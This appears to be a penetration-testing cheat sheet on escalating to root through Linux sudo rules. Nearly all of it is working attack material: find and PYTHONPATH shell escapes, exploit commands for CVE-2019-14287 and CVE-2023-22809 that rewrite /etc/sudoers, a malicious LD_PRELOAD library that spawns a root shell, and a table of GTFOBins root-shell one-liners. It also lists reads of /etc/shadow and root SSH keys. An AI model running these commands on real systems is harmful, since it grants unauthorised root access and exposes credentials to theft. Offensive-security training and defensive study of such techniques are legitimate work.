# Sudo rules and command behavior

## Discover the policy
```bash
id
sudo -V | head -n 1
sudo -n -l
sudo -ll
```
- `-n` never prompts: a password error does not mean no rules. Retry `sudo -l` with a known password.
- Unprivileged `sudo -V` shows less than root would see.

Resolve and read what a rule points at:
```bash
command -v find python3 tar
ls -l /usr/bin/find /usr/bin/python3
namei -l <SCRIPT>
sed -n '1,160p' <SCRIPT>
```
- Use the exact paths from the policy: a familiar name may be a custom wrapper or fixed-argument call.

## Read each field
```text
Matching Defaults entries for <USER> on <HOST>:
    env_reset, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User <USER> may run the following commands on <HOST>:
    (root) NOPASSWD: /usr/bin/find
    (backup) /usr/bin/tar -cf /var/backups/home.tar /home/<USER>
    (root) NOPASSWD: SETENV: /usr/bin/python3 <SCRIPT>
```

| Field | Meaning |
| --- | --- |
| `(root)`, `(backup)`, `(ALL : ALL)` | Allowed run-as user/group: pick with `-u` / `-g` |
| `NOPASSWD` / `PASSWD` | Per command; tags can change within a list |
| No arguments after the binary | Any arguments allowed; `""` = none |
| Fixed args / wildcards / regex | Wildcards span spaces and `/`; anchored regex needs sudo ≥ 1.9.10 |
| `env_reset`, `env_keep` | Which inherited variables survive |
| `SETENV` / `NOSETENV` | Whether you may set variables on the command line |
| `secure_path` | PATH the command runs with |
| `NOEXEC`, `INTERCEPT` | May block child processes |
| `sudoedit` | Runs the editor as you, installs the file as the target |

## Match behavior to permission
| Program does | Next |
| --- | --- |
| Runs another command/interpreter/editor/pager | Does the permitted argument set expose it; child keeps run-as identity? (GTFOBins) |
| Reads caller-chosen file | Read a protected file |
| Writes caller-chosen file | Overwrite vs append, destination mode → [file-write](file-write.md) |
| Runs a fixed script | Imports, config, helpers, working dir, writable deps → [root-run](root-run.md) |
| `sudoedit` | Which file; which privileged process consumes it |

## Command runner with free arguments (find)
```bash
sudo -u root -l /usr/bin/find . -maxdepth 0 -exec /usr/bin/id \;
sudo -u root /usr/bin/find . -maxdepth 0 -exec /usr/bin/id \;
sudo -u root /usr/bin/find . -maxdepth 0 -exec /bin/bash \;
```
- First line only checks the invocation against the policy. Output `uid=0(root)` = works.
- Exact-argument rule: adding `-exec` fails to match.

## Python script with SETENV (PYTHONPATH)
Rule: `(root) NOPASSWD: SETENV: /usr/bin/python3 <SCRIPT>`; script does `import <MODULE>` and no earlier path has it.

```bash
d=$(mktemp -d)
cat > "$d/<MODULE>.py" <<'PY'
import os
os.system("/bin/bash")
PY
sudo -u root PYTHONPATH="$d" PYTHONDONTWRITEBYTECODE=1 /usr/bin/python3 <SCRIPT>
```
- Check the real module name and the function the script calls.
- Script's own directory beats `PYTHONPATH`; `-E`/`-I` in the rule ignores it.
- Proof-only variant: replace the shell line with `print(os.getuid(), os.geteuid())`.

## Environment, LD_PRELOAD, sudoedit
- `sudo VAR=value cmd` ≠ `export VAR=value; sudo cmd`; `env_reset` drops most, `sudo -E` is not unrestricted.
- `LD_PRELOAD`/`LD_LIBRARY_PATH` are stripped for setuid execution and by secure execution.
- `sudoedit`: editor shell escapes run as YOU, not root. Default `sudoedit_checkdir` refuses symlinks/writable directories.
- Kernel/package CVE → [kernel-checks](kernel-checks.md).

## Failed path
| Result | Check |
| --- | --- |
| Password/terminal required | `NOPASSWD` must apply to this exact command |
| Command not allowed | Run-as user, resolved path, exact arguments, exclusions |
| Env assignment rejected | `SETENV`/`NOSETENV` |
| Original Python output | Script dir precedence, `-E`/`-I`, path changes in the script |
| Child command denied | `NOEXEC`, `INTERCEPT`, child path |
| Non-root identity | That account's access and rules are a separate step |
| Root inside a container | Not host root → [groups-and-nfs](groups-and-nfs.md) |

## Sudo version bugs
```bash
sudo -V | head -1
```
Rule `(ALL, !root) /bin/bash`, sudo < 1.8.28 (CVE-2019-14287):
```bash
sudo -u#-1 /bin/bash
```
Rule with `sudoedit`, sudo 1.8.0–1.9.12p1 (CVE-2023-22809): extra `--` arguments in `EDITOR`/`VISUAL` open files outside the rule.
```bash
EDITOR='vim -- /etc/sudoers' sudoedit /path/allowed/by/rule
```
- Then add `<USER> ALL=(root) NOPASSWD: ALL`, `sudo -i`; validate with `visudo -c`. Baron Samedit (heap overflow) → [kernel-checks](kernel-checks.md#known-cve-patterns).

## LD_PRELOAD kept by sudo
Only when `sudo -l` shows `env_keep+=LD_PRELOAD` (or `LD_LIBRARY_PATH`) in the Defaults and the permitted command is dynamically linked.

```c
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
```
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
sudo LD_PRELOAD=/tmp/pe.so <ALLOWED-COMMAND>
```
- Without `env_keep`, `env_reset` drops the variable and this fails. The rule must allow some dynamically linked command; the library runs inside that root process. `LD_LIBRARY_PATH` variant: `ldd <BINARY>`, plant a same-named library in your directory.

## Common sudo / GTFOBins one-liners (offline)
Run as the user the rule names (`sudo -u <RUNAS> ...`). Confirm the binary's exact path and allowed arguments first, and look up anything missing from this list on GTFOBins.

| Binary | Shell |
| --- | --- |
| `vi` / `vim` | `sudo vim -c ':!/bin/sh'` |
| `less` / `more` / `man` / `journalctl` | open anything, then type `!/bin/sh` |
| `nano` | `^R` `^X`, then `reset; sh 1>&0 2>&0` |
| `awk` | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| `perl` | `sudo perl -e 'exec "/bin/sh";'` |
| `php` / `ruby` / `lua` / `node` | `sudo php -r 'system("/bin/sh");'` / `sudo ruby -e 'exec "/bin/sh"'` / `sudo lua -e 'os.execute("/bin/sh")'` / `sudo node -e 'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})'` |
| `env` | `sudo env /bin/sh` |
| `git` | `sudo git -p help config`, then `!/bin/sh` |
| `gdb` | `sudo gdb -nx -ex '!sh' -ex quit` |
| `ftp` | `sudo ftp`, then `!/bin/sh` |
| `mysql` | `sudo mysql -e '\! /bin/sh'` |
| `ssh` | `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x` |
| `rsync` | `sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null` |
| `tar` | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `zip` | `sudo zip /tmp/x.zip /etc/hosts -T -TT 'sh #'` |
| `apt-get` / `apt` | `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh` |
| `nmap` (new) | `echo 'os.execute("/bin/sh")' > /tmp/x.nse; sudo nmap --script=/tmp/x.nse` |
| `nmap` (2.02–5.21) | `sudo nmap --interactive`, then `!sh` |
| `cp` / `tee` / `dd` / `wget` / `curl` | file write as root → [file-write](file-write.md) (sudoers, passwd, authorized_keys) |
| `cat` / `head` / `tail` / `base64` | file read as root: `/etc/shadow`, `/root/.ssh/id_rsa`, `proof.txt` is not a shell |

- Pager-based rows need a real terminal: [stabilize the shell](../foothold/shells.md#stabilize-a-linux-tty) first (`!sh` inside `less` fails without a TTY).
- Turn a read/write primitive into a shell (key, sudoers entry, `/etc/passwd` record) before taking the proof screenshot.
